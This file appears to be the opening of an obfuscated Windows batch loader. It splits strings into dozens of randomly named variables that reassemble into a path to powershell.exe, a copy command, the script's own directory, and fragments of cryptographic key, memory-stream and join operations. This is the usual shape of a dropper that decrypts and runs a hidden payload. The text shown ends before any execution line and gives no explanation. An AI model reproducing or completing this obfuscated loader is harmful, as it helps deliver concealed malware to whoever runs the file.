@echo off
set "fSHZSGnAIE= /"
set "uYLBOWnRJk= C"
set "OMesVjdbyH=we"
set "fMRhqnRiPX=py"
set "OdMskiDZFr=ll"
set "FVNOOfviYy=y "
set "RnTGBcHEHK=\v"
set "LSsHdPZMlH=do"
set "wlgsnnIrtY=st"
set "GETWbRBBBX=po"
set "AoYzeMUwLA=in"
set "ApBGFYINov=Po"
set "hlxPWpojSI=ll"
set "kXivqpFnqZ=1."
set "euicavqLcf=he"
set "KNqquluuGI=we"
set "KaTSMiUtfG=rs"
set "mGmthFkcRg=32"
set "wejBkUaaNq=Sy"
set "qaZbivVCWX=:\"
set "hxIXZVOLES=rS"
set "HmtudLzjIh=Wi"
set "WhwVUYjhop=xe"
set "VIsABVZSbJ=0\"
set "ZvaYoSYKwD=nd"
set "JuEbbeNPZV=ow"
set "dPDXeFdluz=he"
set "eMcJygjTFc=\W"
set "RXtuZFLakS=.e"
set "rpmSpiFrxc=s\"
set "QJlkzXmnlr=co"
set "YJjMPJjhIf=em"
set "dFAmUlHzoJ=ws"
set "nWTiikWqtV=cd"
set "iWaeSWfsYB= %~dp0"
set "LGNQFDwUjA=orF'"
set "DwNaYfhYZw=gMod"
set "MDFOlmRUFg=Syst"
set "ULMfMAJEVF=csnl"
set "LvXmxQkDNy=uEEK"
set "zdMcydXNkq=File"
set "yORJgTtKgE=F'[-"
set "WGIlTXMkmo=mory"
set "jUeNCPcTFF='')("
set "sErGVKHyBp=grap"
set "XAYEzmHkcM=pose"
set "lpQxRdmCHI=in $"
set "UmWaxBlcrl=v.En"
set "wcIZnmvAlL=;$xr"
set "BXyONOVFrS=oin "
set "TUlucBYkzR=PWJ."
set "dimdDMuiVN=$fhM"
set "IERplQPZmd=-joi"
set "PkjyxBHNPx=7Yiv"
set "anDRzZSvuv=ress"
set "qVUhnEDBeH=.Key"
set "qrWATWgKMs=tS46"
set "VnEtGFeqll=rofi"
set "pVVuAoiWPR=Kl.I"
set "JJukOALCaC=Obje"
set "sVOZiSXyOr=DxKl"
set "bUXAxvfYyw=tem."
set "hxBLiednKK=pher"
